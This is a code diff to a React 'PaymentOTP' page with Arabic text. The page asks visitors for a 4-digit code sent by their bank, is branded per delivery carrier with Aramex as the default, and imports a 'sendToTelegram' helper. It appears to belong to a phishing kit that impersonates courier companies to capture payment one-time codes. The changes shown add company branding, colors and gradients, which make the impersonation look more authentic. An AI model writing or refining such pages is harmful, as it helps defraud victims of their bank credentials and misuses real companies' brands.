@@ -9,6 +9,7 @@ import { sendToTelegram } from "@/lib/telegram";
 import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBrandingByCompany } from "@/lib/brandingSystem";
 import {
   InputOTP,
   InputOTPGroup,
@@ -32,6 +33,11 @@ const PaymentOTP = () => {
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const enhancedBranding = getBrandingByCompany(serviceKey);
+  
+  // Use enhanced branding if available, otherwise use service branding
+  const colors = enhancedBranding?.colors || branding?.colors || { primary: '#DC291E', secondary: '#8B1A12' };
+  const gradients = enhancedBranding?.gradients || { primary: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})` };
   
   // Countdown timer
   useEffect(() => {
@@ -204,7 +210,7 @@ const PaymentOTP = () => {
       onKeyDown={handleKeyDown}
       tabIndex={0}
       style={{
-        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+        background: `linear-gradient(135deg, ${colors.primary}08, ${colors.secondary}08)`
       }}
     >
       <div className="container mx-auto px-3 sm:px-4">
@@ -237,16 +243,14 @@ const PaymentOTP = () => {
           <div className="text-center mb-3 sm:mb-6">
             <Badge 
               className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 text-white"
-              style={{
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-              }}
+              style={{ background: gradients.primary }}
             >
               <Lock className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
               <span>التحقق الآمن</span>
             </Badge>
           </div>
           
-          <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${branding.colors.primary}20` }}>
+          <Card className="p-4 sm:p-8 shadow-elevated border-t-4" style={{ borderTopColor: colors.primary, boxShadow: enhancedBranding?.shadows.lg || '0 20px 25px -5px rgba(0, 0, 0, 0.1)' }}>
             <div className="flex items-center justify-between mb-4 sm:mb-6">
               <div className="flex items-center gap-2 sm:gap-3">
                 <div 
@@ -284,11 +288,11 @@ const PaymentOTP = () => {
             <div 
               className="p-3 sm:p-4 rounded-md sm:rounded-lg mb-4 sm:mb-6"
               style={{
-                background: `${branding.colors.primary}10`,
-                border: `1px solid ${branding.colors.primary}30`
+                background: `${colors.primary}10`,
+                border: `1px solid ${colors.primary}30`
               }}
             >
-              <p className="text-xs sm:text-sm" style={{ color: branding.colors.primary }}>
+              <p className="text-xs sm:text-sm" style={{ color: colors.primary }}>
                 تم إرسال رمز التحقق المكون من 4 أرقام إلى هاتفك المسجل في البنك.
               </p>
             </div>
@@ -319,8 +323,8 @@ const PaymentOTP = () => {
                         index={index}
                         className="w-12 h-12 sm:w-16 sm:h-16 text-xl sm:text-3xl font-bold border-2 rounded-lg transition-all"
                         style={{
-                          borderColor: otp[index] ? branding.colors.primary : `${branding.colors.primary}40`,
-                          background: otp[index] ? `${branding.colors.primary}10` : 'transparent'
+                          borderColor: otp[index] ? colors.primary : `${colors.primary}40`,
+                          background: otp[index] ? `${colors.primary}10` : 'transparent'
                         }}
                       />
                     ))}
@@ -374,9 +378,7 @@ const PaymentOTP = () => {
               className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold transition-all hover:shadow-lg"
               onClick={handleSubmit}
               disabled={updatePayment.isPending || isLocked || otp.length < 4}
-              style={{
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-              }}
+              style={{ background: gradients.primary }}
             >
               {updatePayment.isPending ? (
                 <span>جاري التحقق...</span>
